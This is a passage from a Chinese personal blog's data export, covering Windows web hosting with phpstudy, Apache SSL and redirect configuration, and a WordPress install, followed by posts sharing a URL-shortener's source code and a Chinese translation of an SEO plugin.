title=\"有了模样\"></a>有了模样</h3><p>我在阿里云的首页上看到有域名注册，于是尝试着注册了我的第一个域名：<strong>_</strong><em><strong>.top（这个域名现在已经不用了，所以打码了），记得是1块钱首年，嘿嘿，但还是不知道要怎么才能使得访问域名就能访问服务器。因为一直自学，我花费了好几天时间，才知道有域名解析这种东西，于是点击域名管理，找到我的域名后点击解析，点击添加记录，主机记录用了www，记录值就填上了我腾讯云服务器的IP地址，然后访问www.</strong></em><strong>_</strong>.top ，成功访问到了我的网站。再之后我开始自己手写网站，命名为1.html，放到服务器里，结果在我访问服务器的时候，浏览器直接列出了我的网站目录（xampp默认开启了目录列表，不然应该是403禁止访问），要手动点击1.html才能打开网站，这可别扭死了！如下图为列出目录<br><img src=\"https://blog-10039692.file.myqcloud.com/1488433467435_4319_1488433466589.jpg\"><br>下图为403<br><img src=\"https://blog-10039692.file.myqcloud.com/1488433487113_5678_1488433485867.jpg\" alt=\"\"><br>然后尝试各种姿势百度，百度了好长好长时间（估计这种人尽皆知的东西都没人懒得说），才看到了被一句带过的index.html，于是把网页重命名为index.html（修改配置文件也是可以修改默认主页的），成功了！至此，我的网站终于看起来像是一个网站了！如图为我当时建立网站之一：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488432964695_8706_1488432964443.jpg\" alt=\"\"></p>\n<h3 id=\"一服多站\"><a href=\"#一服多站\" class=\"headerlink\" title=\"一服多站\"></a>一服多站</h3><p>之后随着对CTF的了解，萌生了建立一个CTF资源站的想法，然后又想建立一个自己主页（这也算是一个小时候的梦想吧），但是服务器只有一台，IP只有一个，如果都放在同一个目录下用同一个域名的话总觉得别扭，这个要怎么解决呢？又一次和朋友聊天的时候他推荐给我一个软件叫phpstudy，果断放弃xampp使用phpstudy，在phpstudy有一个功能叫做站点域名管理，如下图<br><img src=\"https://blog-10039692.file.myqcloud.com/1488434278819_4925_1488434277635.jpg\" alt=\"\"><img src=\"https://blog-10039692.file.myqcloud.com/1488434289682_3677_1488434288559.jpg\" alt=\"\"><br>于是把需要的域名都通过A记录解析到我的服务器上，再添加到域名管理里边，成功实现了一服多站。<br>随着研究的深入，后来知道：phpstudy是基于apache（也可以选择nginx或iis作为phpstudy的基本程序），通过修改apache的站点配置文件（目录在PHPstudy/Apache/conf/vohsts.conf）也可以实现同样效果，相信聪明的你和我一样一看就懂了，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488436133365_8283_1488436133876.jpg\" alt=\"\"><br>至此，我已经可以较为完善的拥有一个网站服务器了</p>\n<h1 id=\"建站经验\"><a href=\"#建站经验\" class=\"headerlink\" title=\"建站经验\"></a>建站经验</h1><h3 id=\"备案\"><a href=\"#备案\" class=\"headerlink\" title=\"备案\"></a>备案</h3><p>备案对于国内网站来说是必不可少的一个环节，在腾讯云官网首页上就有备案的链接，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488436460607_8841_1488436459506.jpg\" alt=\"\"><br>按照要求一步步备案就好了，这里通常耗时较长，我的第一次备案差不多用了俩月可能还多，备案的过程中域名是不允许有解析的，也就是说，只要你要备案，你的网站必须是关闭的！所以对于有经验的站长来说，一般都是先备案，后建站，不然的话网站运行着好好的突然关了，不知道的人还以为你的网站倒闭了呢！或许有人不信邪，我就不备案咋了？不备案的话刚开始应该是没什么问题的，但使用一段时间之后，国内的服务商就会把你服务器的端口关掉，网站就用不了了，所以记住一句话：要建站，先备案！除非你用的是港服或者外服。</p>\n<h3 id=\"SSL\"><a href=\"#SSL\" class=\"headerlink\" title=\"SSL\"></a>SSL</h3><p>在访问例如腾讯云、百度等网站的时候，会在Chrome浏览器的网址栏看到这样一个绿色的小锁<img src=\"https://blog-10039692.file.myqcloud.com/1488437662385_3300_1488437662130.jpg\" alt=\"\"> ，感觉特别好，但是访问我自己的网站却只有一个灰色的感叹号<img src=\"https://blog-10039692.file.myqcloud.com/1488437772942_1273_1488437772290.jpg\" alt=\"http://dz.gl\"> ，于是就想，我的网站能不能也有这样一个绿色小锁呢？又是一番各种姿势百度，知道了这个是https协议，需要有网站安全证书，到百度搜了一番，都好贵，舍不得花钱啊~但是峰回路转，发现腾讯云有免费的SSL证书，在管理中心-左上角云产品-SSL证书管理里边，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488438092663_448_1488438101157.jpg\" alt=\"\"><br>点击申请证书，按提示操作之后就可以拥有自己的证书了，不过，这个证书只支持2级域名<br><img src=\"https://blog-10039692.file.myqcloud.com/1488438268450_1105_1488438279405.jpg\" alt=\"\"><br>之后在找到对应的证书并且在服务器上安装即可，我用的是Apache，所以把对应SSL证书(有三个文件)上传到服务器某目录下（例如我创建了PHPstudy/SSL文件夹并上传到该目录下），按照网上的教程修改配置文件，具体方法如下：</p>\n<ol>\n<li><p>首先是确认ssl功能是否开启：找到PHPstudy/Apache/conf/httpd.conf这个配置文件中的LoadModule ssl_module modules/mod_ssl.so这句话是否前面有注释符#，如果有的话删掉注释符并保存；<br>在PHPstudy/Apache/conf/httpd.conf中添加这样一句话：Include conf/vhost-ssl.conf 并保存；<br>在PHPstudy/Apache/conf目录下创建vhost-ssl.conf文件，然后编辑（建议使用notepad++编辑，极不推荐记事本）之如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;VirtualHost *:443&gt;</span><br><span class=\"line\"> ServerName www.ctftools.com //这里改为你自己的域名，如果只有一个网站可以把这行删掉</span><br><span class=\"line\"> DocumentRoot  &quot;C:\\WEB\\CTFtools&quot; //这里是你的网站目录</span><br><span class=\"line\"> SSLEngine on</span><br><span class=\"line\"> SSLProtocol  all -SSLv2 -SSLv3</span><br><span class=\"line\"> SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL</span><br><span class=\"line\"> SSLCertificateFile &quot;C:\\phpStudy\\ssl\\downssl\\1.crt&quot; //证书公钥，大小为2.01KB左右</span><br><span class=\"line\"> SSLCertificateKeyFile &quot;C:\\phpStudy\\ssl\\downssl\\3.key&quot; //证书私钥</span><br><span class=\"line\"> SSLCertificateChainFile &quot;C:\\phpStudy\\ssl\\downssl\\2.crt&quot; //证书链，大小为1.88KB左右</span><br><span class=\"line\">&lt;/VirtualHost&gt;</span><br><span class=\"line\">//有几个站点就写几个这样的一段代码</span><br><span class=\"line\">&lt;VirtualHost *:443&gt;</span><br><span class=\"line\"> ServerName www.dr34m.cn</span><br><span class=\"line\"> DocumentRoot &quot;C:\\WEB\\myhome&quot;</span><br><span class=\"line\"> SSLEngine on</span><br><span class=\"line\"> SSLProtocol  all -SSLv2 -SSLv3</span><br><span class=\"line\"> SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL</span><br><span class=\"line\"> SSLCertificateFile &quot;C:\\phpStudy\\ssl\\homessl\\1.crt&quot;</span><br><span class=\"line\"> SSLCertificateKeyFile &quot;C:\\phpStudy\\ssl\\homessl\\3.key&quot;</span><br><span class=\"line\"> SSLCertificateChainFile &quot;C:\\phpStudy\\ssl\\homessl\\2.crt&quot;</span><br><span class=\"line\">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重启phpstudy，然后访问https:// 再加上你的站点，是不是可以访问了？<br><strong>注：</strong>如果遇到重启后无法开启Apache，通常是你的配置文件有问题，要有耐心，慢慢查找配置文件的错误。还有一种可能是你的证书公钥和证书链两个文件反了，颠倒过来即可。</p>\n<h2 id=\"301重定向\"><a href=\"#301重定向\" class=\"headerlink\" title=\"301重定向\"></a>301重定向</h2><p>刚开始是在访问腾讯云的时候，发现无论输入的是<code>qcloud.com</code>，还是<code>www.qcloud.com</code>，或者是<code>http://www.qcloud.com</code>，最后访问的都是<code>https://www.qcloud.com</code>，这个可就挺好玩的了，刚开始以为是做的跳转，在<code>qcloud.com</code>目录下建立一个自动跳转到<code>www.qcloud.com</code>的网页，后来知道是做的301重定向，做301重定向的好处就是对搜索引擎友好。为什么要做301重定向呢？一方面，301重定向可以使例如<code>qcloud.com</code>跳转到<code>www.qcloud.com</code>，这样能增加<code>www.qcloud.com</code>的权重；另一方面，我们之前做的SSL证书用的是443端口，并且网址前缀是https，用301重定向可以使得例如<code>http://www.qcloud.com</code>跳转到<code>https://www.qcoloud.com</code>，没有这步跳转，那我们的SSL证书就白用了，301重定向的办法很多，我用到了其中两种，具体如下：</p>\n<h3 id=\"php做重定向\"><a href=\"#php做重定向\" class=\"headerlink\" title=\"php做重定向\"></a>php做重定向</h3><p>这种是用在例如<code>qcloud.com</code>跳转到<code>www.qcloud.com</code>上的，当然，有些网站的权重是放在没有www的网址上，把有www的跳转到没有www的网址上，也是同样的方法</p>\n</li>\n<li><p>在PHPstudy\\WWW目录下新建文件index.php（对于这种情况就不需要在站点域名配置中添加<strong>非</strong>权重网址了，但是权重网址还是要有的）；</p>\n</li>\n<li><p>编辑该文件如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"> $the_host = $_SERVER[<span class=\"string\">'HTTP_HOST'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">switch</span>($the_host)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"comment\">//下边的就是带www的网址作为权重网址的例子</span></span><br><span class=\"line\">     <span class=\"keyword\">case</span> <span class=\"string\">'ctftools.com'</span>: <span class=\"comment\">//这里改为你的非权重网址</span></span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">         header(<span class=\"string\">'HTTP/1.1 301 Moved Permanently'</span>); <span class=\"comment\">//301是永久重定向的意思</span></span><br><span class=\"line\">         header(<span class=\"string\">'Location:https://www.ctftools.com/'</span>);  <span class=\"comment\">//这里改为你的权重网址</span></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"comment\">//下边的就是不带www的网址作为权重网址的例子</span></span><br><span class=\"line\">     <span class=\"keyword\">case</span> <span class=\"string\">'www.dz.gl'</span>:</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">         header(<span class=\"string\">'HTTP/1.1 301 Moved Permanently'</span>);</span><br><span class=\"line\">         header(<span class=\"string\">'Location:http://dz.gl'</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"comment\">//下边则是不符合以上所有情况的例子，学过编程的应该都知道这些语法</span></span><br><span class=\"line\">     <span class=\"keyword\">default</span>:</span><br><span class=\"line\">     &#123;</span><br><span class=\"line\">         header(<span class=\"string\">'HTTP/1.1 302 Moved Permanently'</span>); <span class=\"comment\">//302则是临时重定向的意思</span></span><br><span class=\"line\">         header(<span class=\"string\">'Location:http://error.ctftools.com/404.html'</span>);  <span class=\"comment\">//这里可以定向到你的404页面</span></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"htaccess做重定向\"><a href=\"#htaccess做重定向\" class=\"headerlink\" title=\".htaccess做重定向\"></a>.htaccess做重定向</h3><p>上边的php方法对于权重网站重定向来说无疑是一种简单的方法，但是对于http向https跳转则没办法了，这就需要.htaccess做重定向（这种方法同样适用于权重网站跳转），方法如下：</p>\n</li>\n</ol>\n<p>1.首先打开<code>PHPstudy/Apache/conf/httpd.conf</code>并检查<code>LoadModule rewrite_module modules/mod_rewrite.so</code>这句话前面有没有注释符#，有则删掉;<br>在<strong>网站目录</strong>下创建.htaccess文件，这种以点开头的文件在windows下不好创建，通常使用dos命令来创建，或者用notepad++，新建一个文件，在保存的时候类型选择所有文件，文件名改为.htaccess，如图：<img src=\"https://blog-10039692.file.myqcloud.com/1488441538912_436_1488441538316.jpg\" alt=\"\"><br>编辑该文件如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;IfModule mod_rewrite.c&gt;</span><br><span class=\"line\">RewriteEngine on</span><br><span class=\"line\">RewriteCond %&#123;SERVER_PORT&#125; !^443$</span><br><span class=\"line\">RewriteRule ^(.*)$ https://www.ctftools.com/$1 [L,R=301]  //改为你的站点</span><br><span class=\"line\">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li>这时候直接访问http:// 加上你的站点，是不是直接就能跳转到https:// 加上你的站点了？</li>\n</ol>\n<h1 id=\"在服务器上安装wordpress\"><a href=\"#在服务器上安装wordpress\" class=\"headerlink\" title=\"在服务器上安装wordpress\"></a>在服务器上安装wordpress</h1><p><strong>wordpress是一个著名的博客系统，安装主要用到了mysql(phpstudy集成了)，具体安装方法如下：</strong></p>\n<h3 id=\"配置MySQL\"><a href=\"#配置MySQL\" class=\"headerlink\" title=\"配置MySQL\"></a>配置MySQL</h3><ol>\n<li>首先修改mysql的密码(针对忘了密码或者不知道密码的童鞋)，如图修改即可；<br><img src=\"https://blog-10039692.file.myqcloud.com/1488443780553_6823_1488443779593.jpg\" alt=\"\"></li>\n<li>接着访问：<a href=\"http://xn--ip-0p3cm89l/phpmyadmin\" target=\"_blank\" rel=\"noopener\">http://你的IP/phpmyadmin</a> 或者点击phpstudy上边的MySQL管理器—MySQL-front（如图）<br><img src=\"https://blog-10039692.file.myqcloud.com/1488443755039_5831_1488443754438.jpg\" alt=\"\"></li>\n<li>新建一个数据库：如图，以在服务器端MySQL-front中操作为例：<br>右击左侧localhost—新建—数据库<br><img src=\"https://blog-10039692.file.myqcloud.com/1488444028336_2727_1488444027827.jpg\" alt=\"\"><br><img src=\"https://blog-10039692.file.myqcloud.com/1488444073489_993_1488444072473.jpg\" alt=\"\"></li>\n</ol>\n<h3 id=\"安装wordpress\"><a href=\"#安装wordpress\" class=\"headerlink\" title=\"安装wordpress\"></a>安装wordpress</h3><ol>\n<li>到<a href=\"https://cn.wordpress.org/\" target=\"_blank\" rel=\"noopener\">wordpress官网</a>下载wordpress并上传到你的服务器某目录下；</li>\n<li>访问”你的目录所绑定域名/wp-admin/install.php”，会出现如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488444539486_5449_1488444539273.jpg\" alt=\"\"></li>\n<li>按图操作：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488444576677_3585_1488444575741.jpg\" alt=\"\"></li>\n<li>如果数据库信息没有问题就会出现<br><img src=\"https://blog-10039692.file.myqcloud.com/1488444591766_7065_1488444590814.jpg\" alt=\"\"></li>\n<li>接着按提示输入你的站点信息：<br><img src=\"https://blog-10039692.file.myqcloud.com/1488444713598_3604_1488444713356.jpg\" alt=\"\"></li>\n<li>这样就可以拥有自己的博客或者论坛了<br>关于windows建站经验就写到这里，以后我或许会改用linux，届时还会和大家分享，感谢阅读</li>\n</ol>"},{"title":"短网址","date":"2017-03-07T14:40:49.000Z","_content":"\n### 短网址系统免费开放，欢迎大佬们使用：[DZ.GL](http://dz.gl) （短址过来）\n### 该域名已经售出，继续提供源码下载\n### 短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。\n\n[下载源码](https://pan.baidu.com/s/1eR406T8)\n### 最后更新于2017-02-21\n### 界面截图：\n<!--more-->\n#### 桌面端：\n\n![](https://blog-10039692.file.myqcloud.com/1488598311743_9689_1488598309420.jpg)\n\n![](https://blog-10039692.file.myqcloud.com/1488598320047_5661_1488598316806.jpg)\n\n![](https://blog-10039692.file.myqcloud.com/1488598326592_8206_1488598323892.jpg)\n\n#### 移动端：\n\n![](https://blog-10039692.file.myqcloud.com/1488598333334_7893_1488598331854.jpg) ![](https://blog-10039692.file.myqcloud.com/1488598342796_3675_1488598342068.jpg)","source":"_posts/post009.md","raw":"---\ntitle: 短网址\ndate: 2017-03-07 22:40:49\ntags: [运维,编程]\n---\n\n### 短网址系统免费开放，欢迎大佬们使用：[DZ.GL](http://dz.gl) （短址过来）\n### 该域名已经售出，继续提供源码下载\n### 短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。\n\n[下载源码](https://pan.baidu.com/s/1eR406T8)\n### 最后更新于2017-02-21\n### 界面截图：\n<!--more-->\n#### 桌面端：\n\n![](https://blog-10039692.file.myqcloud.com/1488598311743_9689_1488598309420.jpg)\n\n![](https://blog-10039692.file.myqcloud.com/1488598320047_5661_1488598316806.jpg)\n\n![](https://blog-10039692.file.myqcloud.com/1488598326592_8206_1488598323892.jpg)\n\n#### 移动端：\n\n![](https://blog-10039692.file.myqcloud.com/1488598333334_7893_1488598331854.jpg) ![](https://blog-10039692.file.myqcloud.com/1488598342796_3675_1488598342068.jpg)","slug":"post009","published":1,"updated":"2020-12-07T02:04:36.626Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdb0018q0sz551ddo2c","content":"<h3 id=\"短网址系统免费开放，欢迎大佬们使用：DZ-GL-（短址过来）\"><a href=\"#短网址系统免费开放，欢迎大佬们使用：DZ-GL-（短址过来）\" class=\"headerlink\" title=\"短网址系统免费开放，欢迎大佬们使用：DZ.GL （短址过来）\"></a>短网址系统免费开放，欢迎大佬们使用：<a href=\"http://dz.gl\" target=\"_blank\" rel=\"noopener\">DZ.GL</a> （短址过来）</h3><h3 id=\"该域名已经售出，继续提供源码下载\"><a href=\"#该域名已经售出，继续提供源码下载\" class=\"headerlink\" title=\"该域名已经售出，继续提供源码下载\"></a>该域名已经售出，继续提供源码下载</h3><h3 id=\"短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。\"><a href=\"#短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。\" class=\"headerlink\" title=\"短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。\"></a>短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。</h3><p><a href=\"https://pan.baidu.com/s/1eR406T8\" target=\"_blank\" rel=\"noopener\">下载源码</a></p>\n<h3 id=\"最后更新于2017-02-21\"><a href=\"#最后更新于2017-02-21\" class=\"headerlink\" title=\"最后更新于2017-02-21\"></a>最后更新于2017-02-21</h3><h3 id=\"界面截图：\"><a href=\"#界面截图：\" class=\"headerlink\" title=\"界面截图：\"></a>界面截图：</h3><a id=\"more\"></a>\n<h4 id=\"桌面端：\"><a href=\"#桌面端：\" class=\"headerlink\" title=\"桌面端：\"></a>桌面端：</h4><p><img src=\"https://blog-10039692.file.myqcloud.com/1488598311743_9689_1488598309420.jpg\" alt=\"\"></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1488598320047_5661_1488598316806.jpg\" alt=\"\"></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1488598326592_8206_1488598323892.jpg\" alt=\"\"></p>\n<h4 id=\"移动端：\"><a href=\"#移动端：\" class=\"headerlink\" title=\"移动端：\"></a>移动端：</h4><p><img src=\"https://blog-10039692.file.myqcloud.com/1488598333334_7893_1488598331854.jpg\" alt=\"\"> <img src=\"https://blog-10039692.file.myqcloud.com/1488598342796_3675_1488598342068.jpg\" alt=\"\"></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"短网址系统免费开放，欢迎大佬们使用：DZ-GL-（短址过来）\"><a href=\"#短网址系统免费开放，欢迎大佬们使用：DZ-GL-（短址过来）\" class=\"headerlink\" title=\"短网址系统免费开放，欢迎大佬们使用：DZ.GL （短址过来）\"></a>短网址系统免费开放，欢迎大佬们使用：<a href=\"http://dz.gl\" target=\"_blank\" rel=\"noopener\">DZ.GL</a> （短址过来）</h3><h3 id=\"该域名已经售出，继续提供源码下载\"><a href=\"#该域名已经售出，继续提供源码下载\" class=\"headerlink\" title=\"该域名已经售出，继续提供源码下载\"></a>该域名已经售出，继续提供源码下载</h3><h3 id=\"短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。\"><a href=\"#短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。\" class=\"headerlink\" title=\"短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。\"></a>短网址系统已经开源，放在了百度网盘，需要的朋友可以下载。</h3><p><a href=\"https://pan.baidu.com/s/1eR406T8\" target=\"_blank\" rel=\"noopener\">下载源码</a></p>\n<h3 id=\"最后更新于2017-02-21\"><a href=\"#最后更新于2017-02-21\" class=\"headerlink\" title=\"最后更新于2017-02-21\"></a>最后更新于2017-02-21</h3><h3 id=\"界面截图：\"><a href=\"#界面截图：\" class=\"headerlink\" title=\"界面截图：\"></a>界面截图：</h3>","more":"<h4 id=\"桌面端：\"><a href=\"#桌面端：\" class=\"headerlink\" title=\"桌面端：\"></a>桌面端：</h4><p><img src=\"https://blog-10039692.file.myqcloud.com/1488598311743_9689_1488598309420.jpg\" alt=\"\"></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1488598320047_5661_1488598316806.jpg\" alt=\"\"></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1488598326592_8206_1488598323892.jpg\" alt=\"\"></p>\n<h4 id=\"移动端：\"><a href=\"#移动端：\" class=\"headerlink\" title=\"移动端：\"></a>移动端：</h4><p><img src=\"https://blog-10039692.file.myqcloud.com/1488598333334_7893_1488598331854.jpg\" alt=\"\"> <img src=\"https://blog-10039692.file.myqcloud.com/1488598342796_3675_1488598342068.jpg\" alt=\"\"></p>"},{"title":"SEO Ultimate 7.6.5.9汉化版（中文版）免费下载","date":"2017-04-02T08:25:27.000Z","_content":"\n**SEO Ultimate 7.6.5.9发布有一段时间了，到网上找了好久，唯一找到的汉化版还是付费才能用的，心里实在不爽，于是花了两天时间亲自汉化了这个程序，免费分享给大家。汉化主要结合谷歌翻译和自己的翻译能力，个别用到了百度翻译和有道翻译，希望大家能喜欢，谢谢！**\n\n#### 汉化效果图1：\n<!--more-->\n![](https://blog-10039692.file.myqcloud.com/1489136345234_8033_1489136340484.jpg)\n\n#### 汉化效果图2：\n\n![](https://blog-10039692.file.myqcloud.com/1489136351472_3072_1489136346786.jpg)\n\n### [点此下载最新汉化版](http://d52.pw/se)\n\n### 匹配SEO Ultimate 7.6.5.9以及之前多数版本，最后更新：2017.4.2\n\n### 安装方法：\n\n1.  进入wordpress后台，下载并安装SEO Ultimate插件\n2.  点击上边的下载链接下载并解压出seo-ultimate-zh_CN.mo\n3.  上传到\n`/wp-content/plugins/seo-ultimate/translations/`\n目录下即可完成\n\n有的朋友会用到深层链接(Deeplink Juggernaut)功能，会发现不支持中文，请下载下边的str.zip解压并替换到\n`/wp-content/plugins/seo-ultimate/includes/jlfunctions/str.php`\n目录下就可以支持中文了\n\n### [点此下载str.zip](http://d52.pw/st)","source":"_posts/post045.md","raw":"---\ntitle: SEO Ultimate 7.6.5.9汉化版（中文版）免费下载\ndate: 2017-04-02 16:25:27\ntags: [分享,汉化]\n---\n\n**SEO Ultimate 7.6.5.9发布有一段时间了，到网上找了好久，唯一找到的汉化版还是付费才能用的，心里实在不爽，于是花了两天时间亲自汉化了这个程序，免费分享给大家。汉化主要结合谷歌翻译和自己的翻译能力，个别用到了百度翻译和有道翻译，希望大家能喜欢，谢谢！**\n\n#### 汉化效果图1：\n<!--more-->\n![](https://blog-10039692.file.myqcloud.com/1489136345234_8033_1489136340484.jpg)\n\n#### 汉化效果图2：\n\n![](https://blog-10039692.file.myqcloud.com/1489136351472_3072_1489136346786.jpg)\n\n### [点此下载最新汉化版](http://d52.pw/se)\n\n### 匹配SEO Ultimate 7.6.5.9以及之前多数版本，最后更新：2017.4.2\n\n### 安装方法：\n\n1.  进入wordpress后台，下载并安装SEO Ultimate插件\n2.  点击上边的下载链接下载并解压出seo-ultimate-zh_CN.mo\n3.  上传到\n`/wp-content/plugins/seo-ultimate/translations/`\n目录下即可完成\n\n有的朋友会用到深层链接(Deeplink Juggernaut)功能，会发现不支持中文，请下载下边的str.zip解压并替换到\n`/wp-content/plugins/seo-ultimate/includes/jlfunctions/str.php`\n目录下就可以支持中文了\n\n### [点此下载str.zip](http://d52.pw/st)","slug":"post045","published":1,"updated":"2020-12-07T02:05:27.509Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdc001aq0sz9reyqp8n","content":"<p><strong>SEO Ultimate 7.6.5.9发布有一段时间了，到网上找了好久，唯一找到的汉化版还是付费才能用的，心里实在不爽，于是花了两天时间亲自汉化了这个程序，免费分享给大家。汉化主要结合谷歌翻译和自己的翻译能力，个别用到了百度翻译和有道翻译，希望大家能喜欢，谢谢！</strong></p>\n<h4 id=\"汉化效果图1：\"><a href=\"#汉化效果图1：\" class=\"headerlink\" title=\"汉化效果图1：\"></a>汉化效果图1：</h4><a id=\"more\"></a>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1489136345234_8033_1489136340484.jpg\" alt=\"\"></p>\n<h4 id=\"汉化效果图2：\"><a href=\"#汉化效果图2：\" class=\"headerlink\" title=\"汉化效果图2：\"></a>汉化效果图2：</h4><p><img src=\"https://blog-10039692.file.myqcloud.com/1489136351472_3072_1489136346786.jpg\" alt=\"\"></p>\n<h3 id=\"点此下载最新汉化版\"><a href=\"#点此下载最新汉化版\" class=\"headerlink\" title=\"点此下载最新汉化版\"></a><a href=\"http://d52.pw/se\" target=\"_blank\" rel=\"noopener\">点此下载最新汉化版</a></h3><h3 id=\"匹配SEO-Ultimate-7-6-5-9以及之前多数版本，最后更新：2017-4-2\"><a href=\"#匹配SEO-Ultimate-7-6-5-9以及之前多数版本，最后更新：2017-4-2\" class=\"headerlink\" title=\"匹配SEO Ultimate 7.6.5.9以及之前多数版本，最后更新：2017.4.2\"></a>匹配SEO Ultimate 7.6.5.9以及之前多数版本，最后更新：2017.4.2</h3><h3 id=\"安装方法：\"><a href=\"#安装方法：\" class=\"headerlink\" title=\"安装方法：\"></a>安装方法：</h3><ol>\n<li>进入wordpress后台，下载并安装SEO Ultimate插件</li>\n<li>点击上边的下载链接下载并解压出seo-ultimate-zh_CN.mo</li>\n<li>上传到<br><code>/wp-content/plugins/seo-ultimate/translations/</code><br>目录下即可完成</li>\n</ol>\n<p>有的朋友会用到深层链接(Deeplink Juggernaut)功能，会发现不支持中文，请下载下边的str.zip解压并替换到<br><code>/wp-content/plugins/seo-ultimate/includes/jlfunctions/str.php</code><br>目录下就可以支持中文了</p>\n<h3 id=\"点此下载str-zip\"><a href=\"#点此下载str-zip\" class=\"headerlink\" title=\"点此下载str.zip\"></a><a href=\"http://d52.pw/st\" target=\"_blank\" rel=\"noopener\">点此下载str.zip</a></h3>","site":{"data":{}},"excerpt":"<p><strong>SEO Ultimate 7.6.5.9发布有一段时间了，到网上找了好久，唯一找到的汉化版还是付费才能用的，心里实在不爽，于是花了两天时间亲自汉化了这个程序，免费分享给大家。汉化主要结合谷歌翻译和自己的翻译能力，个别用到了百度翻译和有道翻译，希望大家能喜欢，谢谢！</strong></p>\n<h4 id=\"汉化效果图1：\"><a href=\"#汉化效果图1：\" class=\"headerlink\" title=\"汉化效果图1：\"></a>汉化效果图1：</h4>","more":"<p><img src=\"https://blog-10039692.file.myqcloud.com/1489136345234_8033_1489136340484.jpg\" alt=\"\"></p>\n<h4 id=\"汉化效果图2：\"><a href=\"#汉化效果图2：\" class=\"headerlink\" title=\"汉化效果图2：\"></a>汉化效果图2：</h4><p><img src=\"https://blog-10039692.file.myqcloud.com/1489136351472_3072_1489136346786.jpg\" alt=\"\"></p>\n<h3 id=\"点此下载最新汉化版\"><a href=\"#点此下载最新汉化版\" class=\"headerlink\" title=\"点此下载最新汉化版\"></a><a href=\"http://d52.pw/se\" target=\"_blank\" rel=\"noopener\">点此下载最新汉化版</a></h3><h3 id=\"匹配SEO-Ultimate-7-6-5-9以及之前多数版本，最后更新：2017-4-2\"><a href=\"#匹配SEO-Ultimate-7-6-5-9以及之前多数版本，最后更新：2017-4-2\" class=\"headerlink\" title=\"匹配SEO Ultimate 7.6.5.9以及之前多数版本，最后更新：2017.4.2\"></a>匹配SEO Ultimate 7.6.5.9以及之前多数版本，最后更新：2017.4.2</h3><h3 id=\"安装方法：\"><a href=\"#安装方法：\" class=\"headerlink\" title=\"安装方法：\"></a>安装方法：</h3><ol>\n<li>进入wordpress后台，下载并安装SEO 